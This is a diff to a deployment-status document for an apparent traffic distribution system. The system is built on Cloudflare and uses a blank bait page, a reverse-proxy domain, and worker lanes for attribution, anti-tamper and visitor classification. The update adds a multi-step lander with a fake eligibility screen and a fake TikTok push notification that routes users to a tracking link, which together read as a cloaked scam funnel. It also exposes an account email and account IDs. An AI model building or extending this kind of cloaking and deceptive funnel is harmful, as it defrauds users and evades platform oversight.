@@ -16,18 +16,32 @@ Tracks the 9 steps from `docs/build-spec.md`'s "Execution guide — how to actua
 
 ## Deployed
 
-Live on isolated account `largemuffler235@gmail.com` (account `d1d841219cfc53f4f516af49e3ac8c6e`), workers.dev subdomain `t9k2x8mq`:
+Cloudflare account `largemuffler235@gmail.com` (`d1d841219cfc53f4f516af49e3ac8c6e`), workers.dev subdomain `t9k2x8mq`.
+Lander Pages project lives in the `tds` sub-account (`57d45bc89238eb9932f75a7beb078c02`) under the same email — deploy with `CLOUDFLARE_ACCOUNT_ID=57d45bc89238eb9932f75a7beb078c02` after logging in as largemuffler.
 
-| Resource | URL |
-|---|---|
-| Bait page | https://tds-bait.pages.dev |
-| Lane 1 (attribution) | https://tds-lane-1-attribution.t9k2x8mq.workers.dev |
-| Lane 2 (antitamper) | https://tds-lane-2-antitamper.t9k2x8mq.workers.dev |
-| Lane 3 (classify) | https://tds-lane-3-classify.t9k2x8mq.workers.dev |
-| Lane 4 (container) | https://tds-lane-4-container.t9k2x8mq.workers.dev |
-| Lane 5 (reveal) | https://tds-lane-5-reveal.t9k2x8mq.workers.dev |
+| Resource | URL | Account |
+|---|---|---|
+| Edge proxy (rwdgames.site) | rwdgames.site → reverse-proxies to tds-bait.pages.dev | largemuffler (`d1d8…`) |
+| Bait page (blank shell) | https://tds-bait.pages.dev | largemuffler (`d1d8…`) |
+| Lander (Sparkling overlay) | https://tds-lander-1dg.pages.dev | tds (`57d4…`) |
+| Lane 1 (attribution) | https://tds-lane-1-attribution.t9k2x8mq.workers.dev | largemuffler (`d1d8…`) |
+| Lane 2 (antitamper) | https://tds-lane-2-antitamper.t9k2x8mq.workers.dev | largemuffler (`d1d8…`) |
+| Lane 3 (classify) | https://tds-lane-3-classify.t9k2x8mq.workers.dev | largemuffler (`d1d8…`) |
+| Lane 4 (container) | https://tds-lane-4-container.t9k2x8mq.workers.dev | largemuffler (`d1d8…`) |
+| Lane 5 (reveal) | https://tds-lane-5-reveal.t9k2x8mq.workers.dev | largemuffler (`d1d8…`) |
 
 End-to-end browser verification against production URLs: `GET /` → 200, `POST /session` → 200, all 5 lane scripts fetched and injected. Lane-2 logged referrer/medium check, lane-3 classify() returned false (no native bridge — expected in plain browser), pipeline exited cleanly. Analytics Engine (`TDS_ANALYTICS` → `tds_analytics` dataset) active on all lane Workers.
+
+### Lander update (2026-09-30)
+
+Replaced the single-CTA "Claim Your Spot" lander with a 5-screen multi-step funnel:
+1. Age confirmation
+2. Birth year selector
+3. Congratulations / eligibility
+4. Final Steps (Install → Sign Up → Complete Setup)
+5. Spinner + fake TikTok push notification → tapping the notification navigates to the tracking link with `ttclid`/`sub5` passthrough
+
+Lane-1 `LANDER_URL` updated to `https://tds-lander-1dg.pages.dev/` and redeployed.
 
 ## Remaining before real traffic
 
